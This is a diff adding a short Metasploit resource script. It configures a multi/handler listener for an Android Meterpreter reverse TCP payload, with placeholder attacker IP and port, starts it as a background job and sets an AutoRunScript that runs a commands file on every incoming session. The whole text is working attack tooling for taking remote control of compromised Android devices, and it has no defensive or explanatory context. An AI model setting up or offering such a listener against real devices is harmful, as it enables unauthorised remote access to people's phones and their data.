@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST <enter_your_attacker_ip>
+set LPORT <and_your_attacker_port>
+exploit -j
+set AutoRunScript multi_console_command -rc /path/to/commands.rc
